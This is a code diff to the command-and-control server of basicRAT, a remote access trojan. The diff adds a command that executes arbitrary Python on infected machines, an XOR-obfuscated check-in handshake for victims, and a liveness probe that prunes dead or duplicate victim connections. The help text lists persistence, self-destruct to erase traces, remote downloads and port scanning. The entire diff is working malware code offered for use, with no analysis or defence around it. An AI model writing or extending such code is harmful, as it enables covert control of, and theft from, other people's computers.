@@ -31,7 +31,7 @@ BANNER = '''
          https://github.com/vesche/basicRAT
 '''
 CLIENT_COMMANDS = [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
-                    'selfdestruct', 'survey', 'unzip', 'wget' ]
+                    'selfdestruct', 'survey', 'unzip', 'wget', 'py' ]
 HELP_TEXT = '''Command             | Description
 ---------------------------------------------------------------------------
 cat <file>          | Output a file to the screen.
@@ -49,7 +49,10 @@ scan <ip>           | Scan top 25 TCP ports on a single host.
 selfdestruct        | Remove all traces of the RAT from the target system.
 survey              | Run a system survey.
 unzip <file>        | Unzip a file.
-wget <url>          | Download a file from the web.'''
+wget <url>          | Download a file from the web.
+py <code>           | exec python code.
+'''
+
 
 
 class Server(threading.Thread):
@@ -67,7 +70,10 @@ class Server(threading.Thread):
     def run(self):
         while True:
             conn, addr = self.s.accept()
-            print("\nnew client [%s]" % addr[0]) 
+            recv_data = xor(conn.recv(4096))
+            if recv_data != "new":
+                continue
+            print("\nnew client [%s]" % addr[0])
             client_id = self.client_count
             client = ClientConnection(conn, addr, uid=client_id)
             self.clients[client_id] = client
@@ -114,8 +120,21 @@ class Server(threading.Thread):
 
     def list_clients(self, _):
         print 'ID | Client Address\n-------------------'
+        
+        addr_set = set()
         for k, v in self.clients.items():
-            print '{:>2} | {}'.format(k, v.addr[0])
+            if v.addr[0] in addr_set:
+                self.remove_client(k)
+                continue
+            else:
+                addr_set.add(v.addr[0])
+
+            try:
+                v.conn.send(xor("live"))
+                v.conn.recv(4096)
+                print '{:>2} | {}'.format(k, v.addr[0])
+            except:
+                self.remove_client(k)
 
     def quit_server(self, _):
         if raw_input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
